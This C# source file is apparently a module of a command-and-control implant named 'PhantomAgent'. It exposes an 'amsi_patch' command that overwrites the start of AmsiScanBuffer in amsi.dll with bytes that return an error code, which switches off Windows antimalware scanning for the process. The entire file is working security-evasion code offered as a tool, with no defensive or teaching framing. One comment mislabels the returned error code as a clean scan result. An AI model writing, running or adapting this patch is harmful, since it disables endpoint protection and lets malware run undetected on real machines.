using System.Runtime.InteropServices;
using System.Text.Json;

namespace PhantomAgent.Modules;

public static class AmsiBypass
{
    public const string Name = "amsi";

    public static Dictionary<string, Func<Dictionary<string, JsonElement>?, object>> GetCommands()
    {
        return new Dictionary<string, Func<Dictionary<string, JsonElement>?, object>>
        {
            ["amsi_patch"] = _ => PatchAmsi(),
        };
    }

    // Patches AmsiScanBuffer in amsi.dll to return AMSI_RESULT_CLEAN (0x80070057 = E_INVALIDARG)
    // Patch bytes: mov eax, 0x80070057; ret → B8 57 00 07 80 C3
    private static Dictionary<string, object> PatchAmsi()
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        IntPtr hAmsi = NativeMethods.LoadLibrary("amsi.dll");
        if (hAmsi == IntPtr.Zero)
        {
            // Force load amsi.dll if not already loaded
            hAmsi = NativeMethods.LoadLibrary("amsi.dll");
            if (hAmsi == IntPtr.Zero)
                return new Dictionary<string, object> { ["error"] = "Failed to load amsi.dll" };
        }

        IntPtr pAmsiScanBuffer = NativeMethods.GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (pAmsiScanBuffer == IntPtr.Zero)
            return new Dictionary<string, object> { ["error"] = "AmsiScanBuffer not found" };

        // mov eax, 0x80070057 (E_INVALIDARG); ret
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

        // Set memory page to RWX
        if (!NativeMethods.VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, 0x40, out uint oldProtect)) // PAGE_EXECUTE_READWRITE
            return new Dictionary<string, object> { ["error"] = $"VirtualProtect failed: {Marshal.GetLastWin32Error()}" };

        try
        {
            Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);

            return new Dictionary<string, object>
            {
                ["status"] = "ok",
                ["technique"] = "AmsiScanBuffer patch",
                ["address"] = $"0x{pAmsiScanBuffer:X}",
                ["patch_size"] = patch.Length,
            };
        }
        finally
        {
            // Restore original protection
            NativeMethods.VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, oldProtect, out _);
        }
    }

    private static class NativeMethods
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);
    }
}
